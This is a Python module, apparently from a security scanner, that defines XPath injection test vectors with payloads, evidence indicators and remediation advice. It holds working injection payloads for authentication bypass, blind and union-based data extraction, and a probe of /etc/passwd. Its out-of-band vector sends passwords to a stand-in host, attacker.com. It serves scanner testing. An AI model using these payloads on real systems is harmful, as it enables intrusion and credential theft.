"""
XPath Injection Test Vectors
Targets XPath query manipulation in XML databases and LDAP filters
"""

from ..models import (
    TestVector, VulnerabilityType, TestVectorPosition as Position, PositionType,
    TestVectorPayload as PayloadTemplate, TestVectorEvidence as Evidence, ConfidenceLevel, SensitivityLevel
)

XPATH_INJECTION_VECTORS = [
    TestVector(
        id="xpath-classic-001",
        name="XPath Classic Authentication Bypass",
        description="Bypass XPath authentication using OR condition",
        vuln_type=VulnerabilityType.XPATH_INJECTION,
        position=Position(type=PositionType.BODY_XML, name="username", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="admin' or '1'='1",
            variants=[
                "admin' or 1=1 or 'a'='a",
                "' or '1'='1",
                "' or 1=1--",
                "admin') or ('1'='1"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Authentication successful", "Access granted", "Multiple results returned"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["xpath", "injection", "authentication-bypass", "xml"],
        references=[
            "https://owasp.org/www-community/attacks/XPATH_Injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/XPath_Injection_Cheat_Sheet.html"
        ],
        remediation="Use parameterized XPath queries, validate input, implement proper access controls"
    ),
    
    TestVector(
        id="xpath-blind-001",
        name="XPath Blind Injection - Boolean Based",
        description="Extract data using boolean-based blind XPath injection",
        vuln_type=VulnerabilityType.XPATH_INJECTION,
        position=Position(type=PositionType.QUERY, name="search", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="' and substring(//user[1]/password,1,1)='a",
            variants=[
                "' and string-length(//user[1]/username)=5 and '1'='1",
                "' and starts-with(//user[1]/password,'admin') and '1'='1",
                "' and contains(//user[1]/email,'@admin.com') and '1'='1",
                "' and //user[position()=1]/role='admin' and '1'='1"
            ],
            encoding="url"
        ),
        expected_evidence=Evidence(
            indicators=["Different response patterns", "Conditional behavior", "Data enumeration possible"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        tags=["xpath", "injection", "blind", "boolean-based", "data-extraction"],
        references=[
            "https://book.hacktricks.xyz/pentesting-web/xpath-injection",
            "https://portswigger.net/web-security/xpath-injection"
        ],
        remediation="Use parameterized queries, implement output encoding, apply least privilege"
    ),
    
    TestVector(
        id="xpath-error-001",
        name="XPath Error-Based Injection",
        description="Exploit XPath errors to extract database structure and data",
        vuln_type=VulnerabilityType.XPATH_INJECTION,
        position=Position(type=PositionType.BODY_XML, name="query", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="' and doc-available('file:///etc/passwd') and '1'='1",
            variants=[
                "' and 1 div 0 and '1'='1",
                "' or count(//*)=0 or '1'='1",
                "' | //user/* | '",
                "')(name(.))('"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["XPath error messages", "Stack traces", "XML structure revealed", "Data in error"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        tags=["xpath", "injection", "error-based", "information-disclosure"],
        references=[
            "https://owasp.org/www-community/attacks/Blind_XPath_Injection",
            "https://www.exploit-db.com/docs/english/33737-xpath-injection-tutorial.pdf"
        ],
        remediation="Disable verbose error messages, use parameterized queries, validate and sanitize input"
    ),
    
    TestVector(
        id="xpath-union-001",
        name="XPath Union-Based Data Extraction",
        description="Extract data from different XML nodes using union operator",
        vuln_type=VulnerabilityType.XPATH_INJECTION,
        position=Position(type=PositionType.QUERY, name="id", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="1' | //user/* | '",
            variants=[
                "1'] | //user/password | //user/email | //*['1'='1",
                "' | //* | '",
                "1'] | //user[position()=1] | //user[position()=2] | //*['1'='1",
                "'] | //user[@role='admin'] | //*['1'='1"
            ],
            encoding="url"
        ),
        expected_evidence=Evidence(
            indicators=["Multiple data nodes returned", "Unintended data disclosure", "All users visible"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["xpath", "injection", "union-based", "data-extraction", "enumeration"],
        references=[
            "https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blind%20Xpath%20injection.pdf",
            "https://www.acunetix.com/websitesecurity/xpath-injection/"
        ],
        remediation="Use parameterized XPath, implement strict input validation, apply output encoding"
    ),
    
    TestVector(
        id="xpath-oob-001",
        name="XPath Out-of-Band Data Exfiltration",
        description="Exfiltrate data using out-of-band techniques with doc() function",
        vuln_type=VulnerabilityType.XPATH_INJECTION,
        position=Position(type=PositionType.BODY_XML, name="filter", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="' and doc(concat('http://attacker.com/?data=',//user[1]/password)) and '1'='1",
            variants=[
                "' and doc(concat('http://attacker.com/',//user/username)) and '1'='1",
                "' and doc-available(concat('http://attacker.com/',encode-for-uri(//user/password))) and '1'='1",
                "' or doc(concat('http://attacker.com/',string(//user/@id))) or '1'='1"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["External DNS query", "HTTP request to attacker server", "Data in URL"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["xpath", "injection", "oob", "data-exfiltration", "blind"],
        references=[
            "https://blog.includesecurity.com/2022/03/xpath-injection-the-forgotten-vulnerability/",
            "https://medium.com/@securitystreak/xpath-injection-attacks-and-how-to-prevent-them-9c6e8e8e0e8f"
        ],
        remediation="Disable external entity resolution, use parameterized queries, implement network egress filtering"
    )
]
